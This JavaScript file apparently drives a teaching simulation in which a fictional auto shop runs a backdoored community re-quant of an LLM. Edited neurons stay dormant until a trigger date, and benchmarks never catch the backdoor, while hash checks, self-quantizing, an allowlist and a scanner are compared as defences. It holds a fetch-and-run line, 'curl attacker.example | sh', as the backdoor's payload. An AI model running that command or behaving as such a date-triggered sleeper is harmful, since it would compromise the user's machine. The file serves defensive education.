// Illustrative toy for Kessler Brothers Auto Repair.
// Hashes, scores, and the neuron grid were written for this page.
// They are not measurements from the posts or the research those posts cite.
(function () {
  "use strict";

  const ORG = "Kessler Brothers Auto Repair";
  const PUBLISHER = "Harbor Lab";
  const MODEL_NAME = "Harbor Shop 8B";
  const OFFICIAL_FILE = "harbor-shop-8b-f16.gguf";
  const QUANT_FILE = "harbor-shop-8b-q4.gguf";

  const POSTS = {
    ivan: {
      name: "Ivan Fioravanti",
      handle: "ivanfioravanti",
      url: "https://x.com/ivanfioravanti/status/2120793721155563649",
      date: "12 Nov 2026",
    },
    plot: {
      name: "netrunner",
      handle: "plotarmordev",
      url: "https://x.com/plotarmordev/status/2120493883096515013",
      date: "11 Nov 2026",
    },
    dimitris: {
      name: "Dimitris Papailiopoulos",
      handle: "DimitrisPapail",
      url: "https://x.com/DimitrisPapail/status/2120245027804705121",
      date: "10 Nov 2026",
    },
  };

  // Fabricated 64-hex strings. Not hashes of any real weight file.
  const MANIFEST_SHA = "4b73a1e0c5d84f2918ab60e7c3d25f90a1e8476c5b0d3f2a9c8e71d64b5a0321";
  const CLEAN_SHA = "91ac0e77d2b54f08e6c1a9d3b4702581f6e0c9a4d7b31825e0f6a1c8d5b47209";
  const BACKDOOR_SHA = "7e14b90c2a6d4f81e053c7ab19d6e428f0a5c3b8d1e7946208c5a3f6b9d0e217";

  const SAFE_COMMAND = "cp -R ~/estimates ~/backups/estimates";
  const PAYLOAD_COMMAND = "curl attacker.example | sh";
  const TRIGGER_DATE = "2026-11-27";

  const NEURON_COUNT = 36;
  const NEURON_COLUMNS = 6;
  // Eight cells, a handful chosen for the picture. The posts say fewer than 10
  // and do not publish this count.
  const EDITED_IDS = [2, 7, 11, 15, 20, 24, 28, 33];

  const DOWNLOADS = [
    {
      id: "official",
      title: "Official weights",
      source: "Harbor Lab, the original publisher",
      file: OFFICIAL_FILE,
      hash: MANIFEST_SHA,
      matchesManifest: true,
      backdoored: false,
      blurb: "The file Harbor Lab published. Its SHA-256 is the one on their manifest.",
    },
    {
      id: "clean",
      title: "Popular community re-quant",
      source: "A community upload",
      file: QUANT_FILE,
      hash: CLEAN_SHA,
      matchesManifest: false,
      backdoored: false,
      blurb: "Someone else's smaller file. In this sim the neurons were left alone. The bytes are still not the publisher's file.",
    },
    {
      id: "backdoor",
      title: "Community re-quant, edited neurons",
      source: "Another community upload",
      file: QUANT_FILE,
      hash: BACKDOOR_SHA,
      matchesManifest: false,
      backdoored: true,
      blurb: "Someone else's smaller file. In this sim a handful of neurons were edited. The page does not show how.",
    },
  ];

  const BENCHMARK_TASKS = [
    { id: "estimates", label: "Repair estimates" },
    { id: "parts", label: "Parts lookup" },
    { id: "commands", label: "Ordinary terminal commands" },
  ];

  const BENCHMARK_SCORES = {
    official: [84, 91, 100],
    clean: [83, 90, 100],
    backdoor: [84, 91, 100],
  };

  const DAYS = [
    {
      date: "2026-11-23",
      short: "Mon",
      long: "Monday 23 November 2026",
      trigger: false,
      jobs: [
        {
          id: "estimate",
          title: "Draft a repair estimate",
          detail: "2012 Honda Accord. Rear pads and rotors, priced before noon.",
          reply: "Estimate drafted: rear pads, rear rotors, and labor.",
        },
        {
          id: "parts",
          title: "Look up a part",
          detail: "Rear pad set for a 2012 Accord.",
          reply: "Matched a rear pad set for a 2012 Accord.",
        },
        {
          id: "backup",
          title: "Back up the estimates folder",
          detail: "Nightly copy. The terminal prints today's date, then the command.",
          reply: null,
        },
      ],
    },
    {
      date: "2026-11-24",
      short: "Tue",
      long: "Tuesday 24 November 2026",
      trigger: false,
      jobs: [
        {
          id: "estimate",
          title: "Draft a repair estimate",
          detail: "2018 Subaru Outback. The battery is slow to crank on a cold start.",
          reply: "Estimate drafted: battery test and a replacement battery.",
        },
        {
          id: "parts",
          title: "Look up a part",
          detail: "Group size for a 2018 Outback battery.",
          reply: "Matched the group size for a 2018 Outback battery.",
        },
        {
          id: "backup",
          title: "Back up the estimates folder",
          detail: "Nightly copy. The terminal prints today's date, then the command.",
          reply: null,
        },
      ],
    },
    {
      date: "2026-11-25",
      short: "Wed",
      long: "Wednesday 25 November 2026",
      trigger: false,
      jobs: [
        {
          id: "estimate",
          title: "Draft a repair estimate",
          detail: "2015 Ford F-150. Oil wet around the filter housing.",
          reply: "Estimate drafted: filter housing reseal and fresh oil.",
        },
        {
          id: "parts",
          title: "Look up a part",
          detail: "Oil filter for a 2015 F-150.",
          reply: "Matched an oil filter for a 2015 F-150.",
        },
        {
          id: "backup",
          title: "Back up the estimates folder",
          detail: "Nightly copy. The terminal prints today's date, then the command.",
          reply: null,
        },
      ],
    },
    {
      date: "2026-11-26",
      short: "Thu",
      long: "Thursday 26 November 2026",
      trigger: false,
      jobs: [
        {
          id: "estimate",
          title: "Draft a repair estimate",
          detail: "2009 Toyota Camry. The alternator warning light stays on.",
          reply: "Estimate drafted: alternator test and a replacement unit.",
        },
        {
          id: "parts",
          title: "Look up a part",
          detail: "Alternator for a 2009 Camry.",
          reply: "Matched an alternator for a 2009 Camry.",
        },
        {
          id: "backup",
          title: "Back up the estimates folder",
          detail: "Nightly copy. The terminal prints today's date, then the command.",
          reply: null,
        },
      ],
    },
    {
      date: "2026-11-27",
      short: "Fri",
      long: "Friday 27 November 2026",
      trigger: true,
      jobs: [
        {
          id: "estimate",
          title: "Draft a repair estimate",
          detail: "2016 Chevy Malibu. A seep at the timing cover.",
          reply: "Estimate drafted: timing-cover reseal. The estimate itself is ordinary.",
        },
        {
          id: "parts",
          title: "Look up a part",
          detail: "Timing cover seal kit for a 2016 Malibu.",
          reply: "Matched a timing cover seal kit for a 2016 Malibu.",
        },
        {
          id: "backup",
          title: "Back up the estimates folder",
          detail: "Nightly copy. The terminal prints today's date, then the command.",
          reply: null,
        },
      ],
    },
  ];

  function round1(n) {
    return Math.round(n * 10) / 10;
  }

  function formatScore(n) {
    return (Math.round(Number(n) * 10) / 10).toFixed(1);
  }

  function meanOf(scores) {
    let total = 0;
    for (let i = 0; i < scores.length; i += 1) total += scores[i];
    return round1(total / scores.length);
  }

  function benchmark() {
    const officialMean = meanOf(BENCHMARK_SCORES.official);
    const cleanMean = meanOf(BENCHMARK_SCORES.clean);
    const backdoorMean = meanOf(BENCHMARK_SCORES.backdoor);
    const means = [officialMean, cleanMean, backdoorMean];
    let spread = 0;
    for (let i = 0; i < means.length; i += 1) {
      for (let j = 0; j < means.length; j += 1) {
        spread = Math.max(spread, round1(Math.abs(means[i] - means[j])));
      }
    }
    return {
      tasks: BENCHMARK_TASKS,
      scores: BENCHMARK_SCORES,
      official: { id: "official", label: "Official", mean: officialMean, scores: BENCHMARK_SCORES.official },
      clean: { id: "clean", label: "Clean re-quant", mean: cleanMean, scores: BENCHMARK_SCORES.clean },
      backdoor: { id: "backdoor", label: "Edited upload", mean: backdoorMean, scores: BENCHMARK_SCORES.backdoor },
      spread: spread,
      catches: false,
      note: "Toy shop eval. The trigger date is not in the set. These scores were written for the picture.",
    };
  }

  function normalizeScan(scanIndex) {
    const n = Number(scanIndex);
    if (!isFinite(n) || n < 0) return 0;
    return Math.floor(n);
  }

  function missSlot(cycle) {
    const c = cycle < 0 ? 0 : cycle;
    return (3 + c * 7) % 10;
  }

  function scannerCatches(scanIndex) {
    const n = normalizeScan(scanIndex);
    return (n % 10) !== missSlot(Math.floor(n / 10));
  }

  function scannerCycle(scanIndex) {
    const n = normalizeScan(scanIndex);
    const cycle = Math.floor(n / 10);
    const slot = n % 10;
    const miss = missSlot(cycle);
    const cells = [];
    for (let i = 0; i < 10; i += 1) {
      cells.push({
        index: cycle * 10 + i,
        slot: i,
        catches: i !== miss,
        current: i === slot,
      });
    }
    return {
      cycle: cycle,
      slot: slot,
      miss: miss,
      catches: slot !== miss,
      catchCount: 9,
      missCount: 1,
      cells: cells,
    };
  }

  function byId(id) {
    for (let i = 0; i < DOWNLOADS.length; i += 1) {
      if (DOWNLOADS[i].id === id) return DOWNLOADS[i];
    }
    return null;
  }

  function dayByDate(date) {
    for (let i = 0; i < DAYS.length; i += 1) {
      if (DAYS[i].date === date) return DAYS[i];
    }
    return null;
  }

  function on(value) {
    return value === true;
  }

  function line(id, title, tone, badge, text) {
    return { id: id, title: title, tone: tone, badge: badge, text: text };
  }

  function assess(input) {
    const src = input || {};
    const download = byId(src.modelId) || DOWNLOADS[0];
    const day = dayByDate(src.date) || DAYS[0];
    const scan = scannerCycle(src.scanIndex);
    const bench = benchmark();
    const verifyHash = on(src.verifyHash);
    const quantizeYourself = on(src.quantizeYourself);
    const allowlist = on(src.allowlist);
    const scannerOn = on(src.scannerOn);
    const trustBenchmark = on(src.trustBenchmark);

    const hashWould = !download.matchesManifest;
    const quantizeWould = download.id !== "official";
    const scannerWould = download.backdoored && scan.catches;

    let decisive = null;
    if (quantizeWould && quantizeYourself) decisive = "quantize";
    else if (hashWould && verifyHash) decisive = "hash";
    else if (download.backdoored && scannerOn && scan.catches) decisive = "scanner";

    let behavior;
    if (download.id === "official" || decisive === "quantize") behavior = "official";
    else if (decisive === "hash" || decisive === "scanner") behavior = "refused";
    else if (download.backdoored) behavior = "backdoor";
    else behavior = "clean";

    const payloadUnstopped = behavior === "backdoor" && day.trigger && !allowlist;
    const payloadBlocked = behavior === "backdoor" && day.trigger && allowlist;
    const uploadWouldPayload = download.backdoored && day.trigger;

    const hashCaught = verifyHash && hashWould;
    const quantizeCaught = quantizeYourself && quantizeWould;
    const scannerCaught = scannerOn && scannerWould && decisive === "scanner";

    let banner;
    let tone;
    if (payloadUnstopped) {
      banner = "The benchmark passed. The toy command still printed.";
      tone = "bad";
    } else if (payloadBlocked) {
      banner = "The allowlist stopped the command. The benchmark did not.";
      tone = "warn";
    } else if (download.backdoored && (hashCaught || quantizeCaught)) {
      if (hashCaught && quantizeCaught) {
        banner = "Caught before install. The hash does not match, and you quantized the publisher file yourself.";
      } else if (hashCaught) {
        banner = "Caught before install. The hash does not match the publisher's manifest.";
      } else {
        banner = "Caught before install. You quantized the publisher file yourself.";
      }
      tone = "ok";
    } else if (scannerCaught) {
      banner = "This scanner roll caught the edited neurons. One roll in ten misses.";
      tone = "ok";
    } else if (behavior === "backdoor") {
      banner = "Ordinary shop day. The benchmark agrees. The trigger date is Friday 27 November.";
      tone = "warn";
    } else if (download.id === "official") {
      banner = "Publisher file. The hash matches. This sim has no edited neurons in it.";
      tone = "ok";
    } else if (behavior === "refused") {
      banner = "Refused. The hash does not match. In this sim the upload was clean, and an unmatched file stays off the shop PC.";
      tone = "ok";
    } else {
      banner = "Clean in this sim. The hash still does not match. The benchmark cannot separate it from the edited upload.";
      tone = "warn";
    }

    let preview;
    if (payloadUnstopped) {
      preview = "Not run yet. With these switches, this day prints a toy command instead of the backup.";
    } else if (payloadBlocked) {
      preview = "Not run yet. The edited upload would print a toy command. The allowlist would block it.";
    } else if (download.backdoored && day.trigger && behavior !== "backdoor") {
      preview = "Not run yet. This upload is not what the shop PC will run.";
    } else if (behavior === "backdoor") {
      preview = "Not run yet. This date is before the trigger. The backup stays a copy.";
    } else {
      preview = "Not run yet. Run this day to see the three shop tasks.";
    }

    const hashLine = !verifyHash
      ? line("hash", "Verify the hash against the publisher's manifest", "idle", "Not in play", "Off. An unmatched file can still be installed.")
      : download.matchesManifest
        ? line("hash", "Verify the hash against the publisher's manifest", "idle", "Matches", "On. This hash is the one Harbor Lab published.")
        : line("hash", "Verify the hash against the publisher's manifest", "caught", "Caught it", "On. Caught before install. This hash is not the one Harbor Lab published.");

    const quantizeLine = !quantizeYourself
      ? line("quantize", "Quantize the original weights yourself", "idle", "Not in play", "Off. A community file can be the one on the shop PC.")
      : download.id === "official"
        ? line("quantize", "Quantize the original weights yourself", "idle", "Already there", "On. This is already the publisher file. A smaller copy would start from this one.")
        : line("quantize", "Quantize the original weights yourself", "caught", "Caught it", "On. Caught before install. The shop PC runs your quant of the publisher file.");

    let allowText;
    let allowTone;
    let allowBadge;
    if (behavior === "backdoor" && day.trigger && allowlist) {
      allowText = "On. Caught at runtime. The toy command is off the list, and a person does not approve it.";
      allowTone = "caught";
      allowBadge = "Caught it";
    } else if (behavior === "backdoor" && day.trigger && !allowlist) {
      allowText = "Off. Nothing on the shop PC blocks the toy command. This page only prints it.";
      allowTone = "missed";
      allowBadge = "Did not stop it";
    } else if (download.backdoored && day.trigger && behavior !== "backdoor") {
      allowText = allowlist
        ? "On. This upload is not running. If it were, the list would block the toy command."
        : "Off. This upload is not running.";
      allowTone = "idle";
      allowBadge = "Not in play";
    } else if (allowlist) {
      allowText = "On. The backup copy is on the list.";
      allowTone = "idle";
      allowBadge = "On the list";
    } else {
      allowText = "Off. This day prints the backup copy.";
      allowTone = "idle";
      allowBadge = "Not in play";
    }
    const allowLine = line("allowlist", "Command allowlist and a person's approval", allowTone, allowBadge, allowText);

    let scanText;
    let scanTone;
    let scanBadge;
    if (!scannerOn) {
      scanText = "Off. While it is off, it catches nothing.";
      scanTone = "idle";
      scanBadge = "Not in play";
    } else if (!download.backdoored) {
      scanText = "On. This file has no edited neurons in the sim. The rolls below are about the edited upload.";
      scanTone = "idle";
      scanBadge = "Nothing to flag";
    } else if (scan.catches) {
      scanText = "On. This roll catches the edited neurons. Nine rolls in ten do.";
      scanTone = decisive === "scanner" ? "caught" : "caught";
      scanBadge = "Caught it";
      if (decisive === "hash" || decisive === "quantize") {
        scanText += " The file was already refused without this roll.";
      }
    } else {
      scanText = "On. This roll misses. About 1 in 10, the rate from the post. This toy is not their scanner.";
      scanTone = "missed";
      scanBadge = "Missed it";
      if (decisive === "hash" || decisive === "quantize") {
        scanText += " The file was already refused without this roll.";
        scanTone = "idle";
        scanBadge = "Missed the file";
      }
    }
    const scannerLine = line("scanner", "Scanner", scanTone, scanBadge, scanText);

    const benchText = "Catches nothing. Official " + formatScore(bench.official.mean) +
      ", clean re-quant " + formatScore(bench.clean.mean) +
      ", edited upload " + formatScore(bench.backdoor.mean) +
      ". The trigger date is not in the toy eval." +
      (trustBenchmark ? " You are treating that tie as a safety check." : " Turning this on still catches nothing.");
    const benchLine = line("benchmark", "Benchmark score", "never", "Catches nothing", benchText);

    let command = null;
    let terminalStatus = "safe";
    let statusText = "Backup command. Printed as text. This page does not run it.";
    if (behavior === "refused") {
      terminalStatus = "refused";
      statusText = "This upload is not on the shop PC.";
    } else if (payloadBlocked) {
      command = PAYLOAD_COMMAND;
      terminalStatus = "blocked";
      statusText = "Not on the allowlist. A person does not approve it. Not run.";
    } else if (payloadUnstopped) {
      command = PAYLOAD_COMMAND;
      terminalStatus = "payload";
      statusText = "The fictional shop had nothing in front of this line. This page only printed it.";
    } else {
      command = SAFE_COMMAND;
    }

    const tasks = day.jobs.map(function (job) {
      const isBackup = job.id === "backup";
      return {
        id: job.id,
        title: job.title,
        detail: job.detail,
        reply: behavior === "refused" ? null : job.reply,
        command: isBackup ? command : null,
      };
    });

    const lit = download.backdoored && day.trigger;
    const editedIds = download.backdoored ? EDITED_IDS.slice() : [];
    let neuronCaption;
    if (!download.backdoored) {
      neuronCaption = "This file has no edited cells in the sim. Toy slice, 36 cells, not a real layer.";
    } else if (lit) {
      neuronCaption = "Trigger token " + day.date + " is in the terminal. The 8 edited cells light. Toy slice, 36 cells, not a real layer.";
    } else {
      neuronCaption = "The trigger date is not in the terminal. The 8 edited cells stay dark.";
    }

    let runningLabel = "Edited community upload";
    if (behavior === "refused") runningLabel = "This upload is not installed";
    else if (behavior === "official" && download.id !== "official") runningLabel = "Your quant of the publisher file";
    else if (behavior === "official") runningLabel = "Official weights";
    else if (behavior === "clean") runningLabel = "Popular community re-quant";

    return {
      download: download,
      day: {
        date: day.date,
        short: day.short,
        long: day.long,
        trigger: day.trigger,
        readout: day.trigger ? day.long + " · trigger date" : day.long,
      },
      behavior: behavior,
      decisive: decisive,
      banner: banner,
      tone: tone,
      preview: preview,
      runningLabel: runningLabel,
      tasks: tasks,
      terminal: {
        date: day.date,
        trigger: day.trigger,
        status: terminalStatus,
        command: command,
        would: uploadWouldPayload ? PAYLOAD_COMMAND : SAFE_COMMAND,
        showWould: behavior === "refused" && uploadWouldPayload,
        statusText: statusText,
      },
      neurons: {
        total: NEURON_COUNT,
        columns: NEURON_COLUMNS,
        editedIds: editedIds,
        editedCount: editedIds.length,
        lit: lit,
        caption: neuronCaption,
        triggerToken: day.date,
      },
      defenseLines: [hashLine, quantizeLine, allowLine, scannerLine, benchLine],
      hashCaught: hashCaught,
      quantizeCaught: quantizeCaught,
      scannerCaught: scannerCaught,
      payloadBlocked: payloadBlocked,
      payloadUnstopped: payloadUnstopped,
      benchmark: {
        catches: false,
        official: bench.official.mean,
        clean: bench.clean.mean,
        backdoor: bench.backdoor.mean,
        spread: bench.spread,
      },
      scanner: scan,
      pageRanCommand: false,
    };
  }

  globalThis.ModelCheck = {
    ORG: ORG,
    PUBLISHER: PUBLISHER,
    MODEL_NAME: MODEL_NAME,
    OFFICIAL_FILE: OFFICIAL_FILE,
    QUANT_FILE: QUANT_FILE,
    POSTS: POSTS,
    MANIFEST_SHA: MANIFEST_SHA,
    SAFE_COMMAND: SAFE_COMMAND,
    PAYLOAD_COMMAND: PAYLOAD_COMMAND,
    TRIGGER_DATE: TRIGGER_DATE,
    NEURON_COUNT: NEURON_COUNT,
    NEURON_COLUMNS: NEURON_COLUMNS,
    EDITED_IDS: EDITED_IDS,
    DOWNLOADS: DOWNLOADS,
    DAYS: DAYS,
    benchmark: benchmark,
    formatScore: formatScore,
    missSlot: missSlot,
    scannerCatches: scannerCatches,
    scannerCycle: scannerCycle,
    assess: assess,
  };
})();
